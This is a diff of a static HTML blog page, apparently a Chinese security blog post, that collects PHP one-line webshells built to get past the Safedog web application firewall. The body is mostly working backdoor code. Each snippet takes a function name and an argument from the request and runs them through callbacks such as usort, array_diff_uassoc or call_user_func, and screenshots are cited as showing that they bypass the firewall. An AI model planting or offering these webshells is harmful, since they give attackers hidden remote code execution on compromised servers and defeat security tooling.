@@ -7,7 +7,7 @@
   <meta name="description" content="">
   <meta name="generator" content="Hugo 0.37.1" />
 
-  <title>Topics &middot; BlankのBlog</title>
+  <title>过狗一句话 &middot; BlankのBlog</title>
 
   
   
@@ -39,8 +39,6 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
  
-  
-  <link rel="alternate" type="application/rss+xml" title="BlankのBlog" href="https://blank233.github.io/topics/index.xml" />
   
 
   
@@ -119,10 +117,6 @@
   <div class="pure-menu social">
   <ul class="pure-menu-list">
 
-    
-    <li class="pure-menu-item">
-      <a class="pure-menu-link" href="https://blank233.github.io/topics/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
-    </li>
     
 
     
@@ -226,33 +220,273 @@
 
 
 <div class="header">
-  <h1>Topics</h1>
+  <h1>过狗一句话</h1>
+  <h2></h2>
 </div>
+
+
 <div class="content">
-  <ul>
+
+  <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>24 Apr 2018, 10:49</time>
+  </div>
+
+  
+
   
   
-    <li>
-      <a href="misc">misc</a>
-      <span>&#40;3&#41;</span>
-    </li>
   
-    <li>
-      <a href="web">web</a>
-      <span>&#40;3&#41;</span>
-    </li>
+  <div>
+    <i class="fa fa-folder fa-fw"></i>
+    
+      <a class="post-taxonomy-topic" href="https://blank233.github.io/topics/web">web</a>
+    
+  </div>
   
-    <li>
-      <a href="test">test</a>
-      <span>&#40;1&#41;</span>
-    </li>
   
-    <li>
-      <a href="write_up">write_up</a>
-      <span>&#40;1&#41;</span>
-    </li>
+
   
-  </ul>
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="https://blank233.github.io/tags/2018-04">2018-04</a>
+    
+  </div>
+  
+  
+
+</div>
+
+  <p>前几天看到P神的一篇关于php回调后门的博客，受益颇多。但那已经是15年的博客了，有些方法已经被狗识别了，就写篇博客整理收集一下过狗一句话。<a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">P神原文</a></p>
+
+<p></p>
+
+<h2 id="序">序</h2>
+
+<ul>
+<li>安全狗的版本</li>
+</ul>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/ggygh/1.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<ul>
+<li>php版本</li>
+</ul>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/ggygh/2.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<h2 id="正文">正文</h2>
+
+<p>先是尝试了一下p神博客里提到的一部分，能过的不多</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$arr = array('1'=&gt;'1',$_REQUEST['pass']);
+// uasort($arr, $e);
+usort($arr, $e);
+?&gt;
+</code></pre>
+
+<p>效果</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/ggygh/3.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>usort和uasort都能过，但是uksort挂掉了，，然后查php手册找到一些</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array( $_REQUEST['pass']=&gt;'1');
+$array2 = array(1);
+array_diff_uassoc($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>array_diff_uassoc()  pass放到键名上  效果</p>
+
+
+
+<div class="pure-g">
+
+  
+  
+  
+  
+  <div class="pure-u-1-1">
+    <div style="padding: 0 .2em">
+      <img
+        class="pure-img-responsive"
+        src="https://blank233.github.io/post/img/ggygh/4.png"
+        alt=" Img of Hugo website">
+    </div>
+  </div>
+  
+
+</div>
+
+
+<p>当然，还能这样</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array( $_REQUEST['pass']=&gt;'1');
+$array2 = array(1);
+array_diff_ukey($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>这样</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array( $_REQUEST['pass']=&gt;'1');
+$array2 = array(1);
+array_intersect_uassoc($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>这样</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array( $_REQUEST['pass']=&gt;'1');
+$array2 = array(1);
+array_intersect_ukey($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>以及这样</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array($_REQUEST['pass']);
+$array2 = array(1);
+array_udiff_assoc($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>这样</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$array1 = array($_REQUEST['pass']);
+$array2 = array(1);
+array_uintersect_assoc($array1, $array2, $e);
+?&gt;
+</code></pre>
+
+<p>&hellip;.</p>
+
+<p>回调后门这个实在是太多了，，再来俩</p>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$pass = $_REQUEST['pass'];
+call_user_func($e,$pass);
+?&gt;
+</code></pre>
+
+<pre><code>&lt;?php
+$e = $_REQUEST['e'];
+$pass = array($_REQUEST['pass']);
+call_user_func_array($e,$pass);
+?&gt;
+</code></pre>
+
+<hr />
+
+<p>结束~~~</p>
+
+  
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1-24" style="text-align: left;">
+    
+    <a href="https://blank233.github.io/post/april_plan/"><i class="fa fa-chevron-left"></i></a>
+    
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="prev">
+      <a href="https://blank233.github.io/post/april_plan/">April_plan</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-2-24">
+    &nbsp;
+  </div>
+  <div class="pure-u-10-24">
+    
+  </div>
+  <div class="pure-u-1-24" style="text-align: right;">
+    
+  </div>
+</div>
+
+
+
+  
+
 </div>
 
 </div>
@@ -279,3 +513,4 @@
 
 </body>
 </html>
+
